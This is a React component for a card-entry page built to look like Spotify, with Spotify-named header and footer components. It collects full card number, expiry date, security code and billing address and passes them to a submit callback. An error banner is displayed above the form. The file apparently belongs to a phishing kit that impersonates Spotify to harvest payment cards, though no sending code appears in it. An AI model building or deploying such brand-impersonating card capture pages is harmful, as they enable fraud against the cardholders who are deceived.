"use client"

import type React from "react"
import { useState } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { ChevronDown } from "lucide-react"
import { COUNTRIES } from "@/lib/countries"
import { SpotifyHeader } from "@/components/spotify-header"
import { SpotifyFooter } from "@/components/spotify-footer"
import { t, type Language } from "@/lib/translations"

interface MyCardsProps {
  onSubmit: (cardData: CardData) => void
  language?: Language
  error?: string
}

export interface CardData {
  cardNumber: string
  expirationDate: string
  securityCode: string
  fullName: string
  address: string
  city: string
  postalCode: string
  country: string
  saveCard: boolean
}

export function MyCards({ onSubmit, language = "en", error }: MyCardsProps) {
  const [cardNumber, setCardNumber] = useState("")
  const [expirationDate, setExpirationDate] = useState("")
  const [securityCode, setSecurityCode] = useState("")
  const [fullName, setFullName] = useState("")
  const [address, setAddress] = useState("")
  const [city, setCity] = useState("")
  const [postalCode, setPostalCode] = useState("")
  const [country, setCountry] = useState("United States")
  const [saveCard, setSaveCard] = useState(false)

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    // Remove spaces for submission
    const cleanCardNumber = cardNumber.replace(/\s+/g, "")
    onSubmit({
      cardNumber: cleanCardNumber,
      expirationDate,
      securityCode,
      fullName,
      address,
      city,
      postalCode,
      country,
      saveCard,
    })
  }

  const formatCardNumber = (value: string) => {
    // Remove all non-digits
    const digits = value.replace(/\D/g, "")
    // Limit to 16 digits
    const limited = digits.slice(0, 16)
    // Add space every 4 digits
    const parts = limited.match(/.{1,4}/g)
    return parts ? parts.join(" ") : limited
  }

  return (
    <div className="flex flex-col min-h-screen bg-[#121212]">
      {/* Header */}
      <SpotifyHeader language={language} />

      {/* Main Content */}
      <main className="flex-1 w-full max-w-[600px] mx-auto px-4 sm:px-8 py-6 sm:py-12">
        {/* Page Title */}
        <div className="flex items-center justify-between mb-8">
          <h1 className="text-2xl sm:text-[32px] font-bold text-white">{t("cards.title", language)}</h1>
          <svg className="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
          </svg>
        </div>

        <form onSubmit={handleSubmit} className="bg-[#282828] rounded-lg p-5 sm:p-8 space-y-6">
          {/* Error Message Placement */}
          {error && (
            <div className="bg-red-500/10 border border-red-500 text-red-500 p-3 rounded-md text-sm text-center font-bold">
              {error}
            </div>
          )}

          {/* Credit or Debit Card Section */}
          <div>
            <div className="flex items-center justify-between mb-4">
              <label className="text-xs sm:text-sm font-bold text-white">{t("cards.creditDebit", language)}</label>
              <svg className="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
              </svg>
            </div>
            <div className="flex gap-3 flex-wrap">
              <CardIcon type="visa" />
              <CardIcon type="mastercard" />
              <CardIcon type="amex" />
            </div>
          </div>

          {/* Card Number */}
          <div>
            <label className="text-xs sm:text-sm font-bold text-white block mb-2">{t("cards.cardNumber", language)}</label>
            <Input
              type="text"
              inputMode="numeric"
              placeholder="0000 0000 0000 0000"
              value={cardNumber}
              onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
              maxLength={19}
              className="w-full h-12 bg-[#1a1a1a] border border-[#404040] rounded-md text-white placeholder:text-[#666666] px-4 focus:border-white focus:ring-0 text-base"
            />
          </div>

          {/* Expiration Date and Security Code */}
          <div className="grid grid-cols-2 gap-4">
            <div>
              <label className="text-xs sm:text-sm font-bold text-white block mb-2">{t("cards.expirationDate", language)}</label>
              <Input
                type="text"
                inputMode="numeric"
                placeholder={t("cards.expirationPlaceholder", language)}
                value={expirationDate}
                onChange={(e) => {
                  let value = e.target.value.replace(/\D/g, "")
                  if (value.length >= 2) {
                    value = value.slice(0, 2) + "/" + value.slice(2, 4)
                  }
                  setExpirationDate(value)
                }}
                maxLength={5}
                className="w-full h-12 bg-[#1a1a1a] border border-[#404040] rounded-md text-white placeholder:text-[#666666] px-4 focus:border-white focus:ring-0 text-base"
              />
            </div>
            <div>
              <label className="text-xs sm:text-sm font-bold text-white block mb-2">{t("cards.securityCode", language)}</label>
              <div className="relative">
                <Input
                  type="text"
                  inputMode="numeric"
                  pattern="[0-9]*"
                  placeholder="000"
                  value={securityCode}
                  onChange={(e) => setSecurityCode(e.target.value.replace(/\D/g, "").slice(0, 4))}
                  maxLength={4}
                  className="w-full h-12 bg-[#1a1a1a] border border-[#404040] rounded-md text-white placeholder:text-[#666666] px-4 focus:border-white focus:ring-0 text-base"
                />
                <svg className="absolute right-3 top-1/2 transform -translate-y-1/2 w-5 h-5 text-[#666666]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                </svg>
              </div>
            </div>
          </div>

          {/* Billing Information */}
          <div>
            <h3 className="text-xs sm:text-sm font-bold text-white mb-4">{t("cards.billingInfo", language)}</h3>

            {/* Full Name */}
            <div className="mb-4">
              <label className="text-xs sm:text-sm font-bold text-white block mb-2">{t("cards.fullName", language)}</label>
              <Input
                type="text"
                placeholder={t("cards.fullNamePlaceholder", language)}
                value={fullName}
                onChange={(e) => setFullName(e.target.value)}
                className="w-full h-12 bg-[#1a1a1a] border border-[#404040] rounded-md text-white placeholder:text-[#666666] px-4 focus:border-white focus:ring-0 text-base"
              />
            </div>

            {/* Address */}
            <div className="mb-4">
              <label className="text-xs sm:text-sm font-bold text-white block mb-2">{t("cards.address", language)}</label>
              <Input
                type="text"
                placeholder={t("cards.addressPlaceholder", language)}
                value={address}
                onChange={(e) => setAddress(e.target.value)}
                className="w-full h-12 bg-[#1a1a1a] border border-[#404040] rounded-md text-white placeholder:text-[#666666] px-4 focus:border-white focus:ring-0 text-base"
              />
            </div>

            {/* City and Postal Code */}
            <div className="grid grid-cols-2 gap-4 mb-4">
              <div>
                <label className="text-xs sm:text-sm font-bold text-white block mb-2">{t("cards.city", language)}</label>
                <Input
                  type="text"
                  placeholder={t("cards.cityPlaceholder", language)}
                  value={city}
                  onChange={(e) => setCity(e.target.value)}
                  className="w-full h-12 bg-[#1a1a1a] border border-[#404040] rounded-md text-white placeholder:text-[#666666] px-4 focus:border-white focus:ring-0 text-base"
                />
              </div>
              <div>
                <label className="text-xs sm:text-sm font-bold text-white block mb-2">{t("cards.postalCode", language)}</label>
                <Input
                  type="text"
                  inputMode="numeric"
                  placeholder={t("cards.postalCodePlaceholder", language)}
                  value={postalCode}
                  onChange={(e) => setPostalCode(e.target.value)}
                  className="w-full h-12 bg-[#1a1a1a] border border-[#404040] rounded-md text-white placeholder:text-[#666666] px-4 focus:border-white focus:ring-0 text-base"
                />
              </div>
            </div>

            {/* Country */}
            <div className="mb-4">
              <label className="text-xs sm:text-sm font-bold text-white block mb-2">{t("cards.country", language)}</label>
              <div className="relative">
                <select
                  value={country}
                  onChange={(e) => setCountry(e.target.value)}
                  className="w-full h-12 bg-[#1a1a1a] border border-[#404040] rounded-md text-white px-4 focus:border-white focus:ring-0 appearance-none text-base"
                >
                  {COUNTRIES.map((c) => (
                    <option key={c} value={c}>
                      {c}
                    </option>
                  ))}
                </select>
                <ChevronDown className="absolute right-3 top-1/2 transform -translate-y-1/2 w-5 h-5 text-[#666666] pointer-events-none" />
              </div>
            </div>
          </div>

          {/* Save Card Checkbox */}
          <div className="flex items-start gap-3">
            <input
              type="checkbox"
              id="saveCard"
              checked={saveCard}
              onChange={(e) => setSaveCard(e.target.checked)}
              className="mt-1 w-4 h-4 bg-[#1a1a1a] border border-[#404040] rounded cursor-pointer"
            />
            <div>
              <label htmlFor="saveCard" className="text-xs sm:text-sm font-bold text-white cursor-pointer">
                {t("cards.saveCard", language)}
              </label>
              <p className="text-xs text-[#a7a7a7] mt-1">{t("cards.saveCardInfo", language)}</p>
            </div>
          </div>

          {/* Buttons */}
          <div className="flex flex-col sm:flex-row gap-3 sm:gap-4 pt-4">
            <Button
              type="submit"
              className="flex-1 h-12 bg-[#1ed760] hover:bg-[#1fdf64] text-black font-bold rounded-full transition-all text-sm sm:text-base"
            >
              {t("cards.register", language)}
            </Button>
            <Button
              type="button"
              onClick={() => window.history.back()}
              className="flex-1 h-12 bg-transparent border border-[#404040] text-white font-bold rounded-full hover:border-white transition-all text-sm sm:text-base"
            >
              {t("cards.cancel", language)}
            </Button>
          </div>
        </form>
      </main>

      {/* Footer */}
      <SpotifyFooter language={language} />
    </div>
  )
}

function CardIcon({ type }: { type: "visa" | "mastercard" | "amex" }) {
  const icons: Record<string, React.ReactNode> = {
    visa: (
      <svg width="48" height="32" viewBox="0 0 48 32" fill="none" xmlns="http://www.w3.org/2000/svg">
        <rect width="48" height="32" rx="4" fill="#1A1F71" />
        <text x="50%" y="50%" dominantBaseline="middle" textAnchor="middle" fill="white" fontSize="10" fontWeight="bold">
          VISA
        </text>
      </svg>
    ),
    mastercard: (
      <svg width="48" height="32" viewBox="0 0 48 32" fill="none" xmlns="http://www.w3.org/2000/svg">
        <rect width="48" height="32" rx="4" fill="#EB001B" />
        <circle cx="18" cy="16" r="8" fill="#FF5F00" />
        <circle cx="30" cy="16" r="8" fill="#FFD700" />
      </svg>
    ),
    amex: (
      <svg width="48" height="32" viewBox="0 0 48 32" fill="none" xmlns="http://www.w3.org/2000/svg">
        <rect width="48" height="32" rx="4" fill="#006FCF" />
        <text x="50%" y="50%" dominantBaseline="middle" textAnchor="middle" fill="white" fontSize="8" fontWeight="bold">
          AMEX
        </text>
      </svg>
    ),
  }

  return <div className="flex-shrink-0">{icons[type]}</div>
}
